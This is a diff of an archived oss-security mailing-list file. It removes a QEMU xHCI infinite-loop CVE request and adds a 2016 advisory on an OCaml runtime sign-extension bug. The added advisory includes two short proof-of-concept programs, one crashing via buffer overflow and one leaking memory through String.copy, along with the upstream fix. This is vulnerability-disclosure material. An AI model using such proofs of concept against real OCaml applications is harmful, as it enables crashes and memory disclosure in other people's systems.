@@ -1,29 +1,74 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/10/6
-Message-ID: <alpine.LFD.2.20.1610101456570.25689@wniryva>
-Date: Mon, 10 Oct 2016 15:00:43 +0530 (IST)
-From: P J P <ppandit@...hat.com>
-To: oss security list <oss-security@...ts.openwall.com>
-cc: Li Qiang <liqiang6-s@....cn>
-Subject: CVE request Qemu: usb: xHCI: infinite loop vulnerability in xhci_ring_fetch
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/29/1
+Message-ID: <4868d0749e044d6491f11118f6e10d45@S1688.EX1688.lan>
+Date: Fri, 29 Apr 2016 00:18:22 +0000
+From: Pascal Cuoq <cuoq@...st-in-soft.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+CC: "cve-assign@...re.org" <cve-assign@...re.org>
+Subject: buffer overflow and information leak in OCaml < 4.03.0
 Content-Type: text/plain; charset=utf-8
 
-   Hello,
+OCaml versions 4.02.3 and earlier have a runtime bug that, on 64-bit platforms, causes sizes arguments to an internal memmove call to be sign-extended from 32 to 64-bits before being passed to the memmove function.
 
-Quick Emulator(Qemu) built with the USB xHCI controller emulation support is 
-vulnerable to an infinite loop issue. It could occur while processing USB 
-command ring in 'xhci_ring_fetch'.
+This leads arguments between 2GiB and 4GiB to be interpreted as larger than they are (specifically, a bit below 2^64), causing a buffer overflow.
 
-A privileged user/process inside guest could use this issue to crash the Qemu 
-process on the host leading to DoS.
+Arguments between 4GiB and 6GiB are interpreted as 4GiB smaller than they should be, causing a possible information leak.
 
-Upstream patch
---------------
-   -> https://lists.gnu.org/archive/html/qemu-devel/2016-10/msg01265.html
+This commit fixes the bug: https://github.com/ocaml/ocaml/commit/659615c7b100a89eafe6253e7a5b9d84d0e8df74#diff-a97df53e3ebc59bb457191b496c90762
+The function caml_bit_string is called indirectly from such functions as String.copy. String.copy for instance is supposed to be a "safe" function for which OCaml's memory safety guarantees apply.
 
-This issue was reported by Li Qiang of 360.cn Inc.
+Proof of concept:
+- buffer overflow
 
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
+Hexa:~ $ ocamlopt -v
+
+The OCaml native-code compiler, version 4.00.1
+
+Standard library directory: /usr/local/Frama-C/ocaml-4.00.1p/lib/ocaml
+
+Hexa:~ $ cat buffer_ovflw.ml
+
+open Printf
+
+
+let s1 = String.make 0x80000003 'a';;
+
+let () = Printf.printf "%c" s1.[1];;
+
+let s2 = String.copy s1;;
+
+let () = Printf.printf "%c" s2.[1];;
+
+Hexa:~ $ ocamlopt buffer_ovflw.ml && ./a.out
+
+Segmentation fault: 11
+
+- information leak
+
+Hexa:~ $ cat infoleak.ml
+
+let s1 = String.make 0x100000003 'a';;
+
+let () = Printf.printf "%c" s1.[1];;
+
+let s2 = String.copy s1;;
+
+let () =
+
+  for i = 4 to 40 do
+
+    Printf.printf "%2x" (Char.code s2.[i]);
+
+  done;
+
+  Printf.printf "\n"
+
+;;
+
+Hexa:~ $ ocamlopt infoleak.ml && ./a.out
+
+a 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
+
+
+OCaml applications, compiled with OCaml 4.02.3 or earlier on a 64-bit platform, that apply the defective copy functions to untrusted inputs are at risk. These applications should be recompiled with OCaml 4.03.0.
+
